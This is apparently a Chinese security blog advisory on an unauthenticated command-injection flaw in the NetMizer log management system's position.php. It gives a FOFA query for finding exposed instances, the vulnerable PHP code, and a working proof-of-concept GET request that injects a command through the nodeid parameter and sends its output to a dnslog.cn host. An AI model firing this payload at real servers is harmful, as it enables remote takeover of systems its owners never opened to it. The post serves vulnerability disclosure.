---
title: "NetMizer日志管理系统 position.php 命令执行漏洞"
source: https://mrxn.net/jswz/netmizer-data-search-position-nodeid-rce.html
asset_dir: assets/netmizer日志管理系统-position.php-命令执行漏洞
---

# NetMizer日志管理系统 position.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/11 08:26
- 1027浏览
- [0评论](#comment)
- 19分钟阅读

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/search/position.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。

漏洞修复方案

# 影响版本

老旧版本

# fofa语法

`body="日志管理系统" && body="NetMizer"`

# 漏洞分析

看下 `position.php` 业务实现关键逻辑部分

```
<?php
        include('../include/JSON.php');

        $cmd = "/var/www/cgi-bin/search_qq";

        if(!$starttime){
                $stop_time = floor(time()/300)*300;
                $stop_time = 1471338000+3600;
                $start_time = $stoptime - 600;
        } else {
                list($year,$month,$day,$hour,$min,$second)=split(":| |-", urldecode($starttime));
                $start_time = mktime($hour, $min, $second, $month,$day,$year);
                $cmd .= " -s $start_time";
                list($year,$month,$day,$hour,$min,$second)=split(":| |-", urldecode($stoptime));
                $stop_time  = mktime($hour, $min, $second, $month,$day,$year);
                $cmd .= " -e $stop_time";
        }

        if($nodeid != ""){
                $sql_nodeid = " and nodeid = ".ip2long($nodeid)." ";
                $cmd .= " -n $nodeid";
        } else        $sql_nodeid = "";

        $srcip = $src;
        if($srcip == ""){
                $srcid = "-1";
        } else $srcid = ip2long($srcip); 
        if($srcid != "-1"){
                $sql_srcid = " and srcip = $srcid ";
                $cmd .= " -S $srcid";
        } else {
                $sql_srcid = "";
        }

        if($action == 'file'){
                //echo $cmd."\n";
                $fp = @popen($cmd,"r");
                if(!$fp){
                        echo '{"success":true,"info":"no data"}';
                        return;
                }
```

`$nodeid` 未经过过滤或转义就直接插入命令字符串中使用`popen`执行拼接后的命令，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

软件

```
GET /data/search/position.php?action=file&nodeid=1;ping+`whoami`.dnslog.cn+%23+ HTTP/1.1
Host: netmizer.mrxn.net
```

在DNSLOG平台成功收到DNS请求

[![NetMizer日志管理系统 position.php 命令执行漏洞](images/img-001-f943bea72184.webp)](https://image.mrxn.net/9900522a732448639dcc6afdb086c1c9.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALKElEQVR4AeybgXLbug5Efe7//3Nf1shRKIi0nLQTe+YpU3S5iwXEEHRzlZn73+12+/OT+PP5dVb7afsx2L83UB9Rj5pcVBfVV6hPPPOZ1/8TzEA+6q4/73IC20A+pnt7Js42bg99wA2QniIw9UPpUGgjnxeEymWd0AOPdX0ilF/eESoPhT0vzx6eCf3BbSAhV7z+BA4DgZo67PHZrULV6feGwF6HOddvfceeh+oDdOsptxew+1Sq2+CM61shVH/Y48x/GMjMdGm/dwJ/PRBvT0e/BahbIRf1Q+U7h9L1i1C6fvVg16C8yc0CKt/ruhfKB4U9f1bf/Y/4Xw/kUfMr9/0T+GcDge/dHtj7Yc+9dWL/1mDvTx5Kg8JVbbyJZ/Mr30pP75/GPxvITzdw1e1P4DAQp95xX/bFoG7jl3K73QYClbffkJou9UHVTU0for4ZfqTvf2DfA4pbA8VhjvcmH39B5XvdR+qpP9Z1nBUfBjIzXdrvncA2EKhbAI9xtTWnD1Uv736Y5/XDPg97vuoH9NT2mwcTq2f0vPxZBHbvMdZB6fAY9Qe3gYRc8foT+M9b813sW4e6BV23b9c7h5/V2z/Ye8qTS8D8GfrOEKo+vRL6s050Hu27cX1CPMU3wcNAoG4B7NH9Qulysd8E2PuguD7Yc3X7iVA+uQilwxFXHp8hQtXKrZPDPq+uT4TywRz1iTD3AbfDQG7X10tP4DCQ1S1wlz0vh/3U1Vd16iuE6mceitt3hnrPEPa9Vn6fYR6qTi52n7oI+zr9MzwMxCYXvuYEDgOBmqbTc1tQOsxRn3VQPnURStenLnZd/ufPn/t7hb4Zdm/nsH82FIfH6LPsB+VXhz3XZ/4MoeqB62fI7c2+/oOv6QD3W5gJQ+lZJ9x31gm5GC3ROVQfKDQvwl6H4umVOPNB+QGt97dm+OJb4nMB3D3pP4tP23YWctjXqdtDLq508zM8/JM1M13a753AYSBQt8AtQHGnDXveffJn0b4rP8yft/I/o/tMqN5QaO1ZXh9UHRSu9LN+5oOHgdj0wtecwDaQTCex2gbULYgnoS/rMaB8Pb/isPfrE+0N5YNCdX1BmOdgr0Px1CRmvWb6s77UPopVn9RsAwm54vUnsP221604vY7mYX+7oDgU6hNhrpv3OTD3Qen6xF4fXa1jcgnY9+o+qDzsceVTh/LL86yEHCofLdF1qDxwvYfc3uxr+ycLvqYEx3UmOwaUx+9nzGV9pptfIez7r3wzHaoWCvVkXwn5HT/+grkv3jE+rPc/anfy4K/ug/PnbAN50PdK/eIJbAPp03QP6lDThcKel8M+v9KhfFCoz+etuLoIVQ8obW/Y9gLub+YaoLj5jvpEKD8Uqoureij/Km/9iNtARvFav+4Ett9l9S04VXV5R/Owvw1Q3Lx1sNefzeuDeX3y/Rmw98KcQ+lQmF5j2Fc0J4eqg0LzIpQOezQ/4vUJGU/jDdbL9xCYTxP2OhTv34u3p+srDtXHOhFKt0698+hQ3qwTesRoY5zpUP30wWNub9j7rBe7D8oPXO8htzf7OvyTBTUt9+k0n+VQ9VBondj7dR3mdfqg8nBEe0PlrOk6VH6lwz5vHxEe5/V19Hnq8hEPA9F84WtOYBsI7Kfu1KB02KN5t73iUHX6oLh+EUrvvs71zxCqhzlrv4vWQ/WDwt4H5vrtdttZ7acIVQeF6sFtICFXvP4EtoE4RThObdxm90H5odC8NXKovLoIpevrqE+E8ncOKN3fymHNfQZw98rFrdHnQv0Mofp9lm2/MZCLvY96cBtIyBWvP4HtTR3204U9d6sw1526vmex10H1h8Kety9UXv4IVz2sgeoFe7QOSu/+Fe867OtXeeB6D7m92dfhTd39eTs6VxfNi1C3AQrVux/2+TNfr5fPcNVLXZzVjlr3yVc41o7rlV999F4/QzyVN8FtIOOUsl7tD+Y3u/vTIwHlh8JoY1gHlZePnqzVO0LVAT11/y8oYEMN8KXBcb3yqYtQtXIR5nrP5/tKQPmB62fI7c2+tk/Im+3r/3Y7y4EAt0Q/mXzEEl2PN9H1eBNd7zyeRHokzGc9hrqYGkNNVD/D7u/c+q7LO3b/d/LLgfQmF/+dE9gG4i30sX3K5juu/Or67SdfoXUdrVdf1UfXI0ZLyMVoic6jjWFeNPfsnqzr2Puk3zaQbr74a05g+9VJppNwamK0hNvLOiHvmFyi6/brerwJ9awT+rNOyPU9g9akPmGNujy5xIqri/Em5B2TS6hnnZCL0RLy4PUJySm8UWy/OvHWZGJj9L3qU9crF7tPXTyrW+V7vb5gz8k7xjuGeTW56Pcidl2+qjcv2kdUD16fkJzCG8XpQJyi0xf796BPfeXrunXqorpo32fQGnutavSt8l1f9fuubt9Z3elALL7wd05gG8hsWuMWvE2ifrnezvWJt5vOOVrf/XLRav1Bc2K0hF4xWkKfuphcQt59ySXUs34U9hEf1W0D0Xzha09gew9xG05aLjpVUb2j+VUf/ea/6+/18hHtrSYXuy5fYa9b+dT9nkT1jrP89Qnpp/RifhjIbGrjHvtt0S+al4+1s/WZ3z6ifnupB9U6JpdQz3oM9VXvnre2+7vvjM/qDwOxyYWvOYHDm7rbcHr9NnSuzzrzcvOievetdOtEfY/wu73tZZ347DP1i/YT1Xs/9RGvT4in9ia4DcQpOcXO3W/Pd928un3kPX+m93r9M7S32D3qYu+tLva83Lz95aJ6R+tF/SNuA+nFF3/NCRzeQ9yGU5M7VbHnu0/efWf11n0X47d3x+QSKz25hPmsE+5dXZ5cQj3rhFzs/nhmoT94fUJmJ/RCbflfWZlWou/NqSc3C/365HrlorqoLtqn5zuPX2/WY5zp5sXe+0wfn5V198s7+pxRvz4hOcE3iuVAnJpTdM+dq+sX1UV1Ub1jz/s89c7Vg+Z6z87jTZz5ez41CfWOySXUs07IRfeTXEI9uByIRRf+7gkcBpIpjeF2MslZmLdmxVe6PZ/Nr3zqwbOe7rX7UjsL/aJ1Ha1V1991uag/eBiIpgtfcwKHgWRKY7gtpy2qj96su77yq4upTVjfsfviTXRfuN6sE/Elsk5kneg+eXKJeMeIllDTv0J9oj75DA8DmZku7fdOYPmmvppmbkhilVcX4030bylaYqUnl7BP9814/GN0jzl1uc+Qf+W//kea5PSt8vE8E/aZ4fUJ8XTfBLc39T6t1f709bx6vyHqK9Tf+8nNi+qrftH1WBMtoZ51Qr7ymY83oa/rncc7Rs/LZ3h9Qman8kJt+xni9J9F9+xNsO5MN7/ym7dvR/OifYJqorWdx5tQF6Mlep15dVG9Y3okzvR4elyfkH5qL+bbQJz6Ga722+v0qfeboK7P/Eo3r1/UH1Tr2GvjHUO/WvebV+9oXrSPXOy6fMRtIBZd+NoTOAykT1++2mbPyzv2evPq3hK5+a73vL4Ru6fz0Zu1z8g6oV+MlpCvMJ5ZdH/3jPnDQMbktf79E3jZQLyVoremH4G6PvOdR59pz+g+I97Eqk9yCfMrjCdhPusx1EWfH3zZQMYNXuuvE/hnA8l0E07dR8g7mk9NonP9Z7r5Z7D3tKbr2U+i5/UlN4Y+UV/n1qh3Hv2fDSTNrvj7EzgMxOl2XD1K3yqvPrsNyT1br6/3UQ+ucnnOGPEm1KyLllDPOiHXJ08uITcvdl0upjYhDx4GEvGK153ANhCneoarrWbSCfNZJ+yXdcK8ujy5hPwMe338qR8j2qOwhzV65eZF82LXrRP1dW6dqC+4DSTkitefwDWQ189gt4P/AQAA//+FmcpcAAAABklEQVQDANyXOqdPpysIAAAAAElFTkSuQmCC)

手机扫码阅读
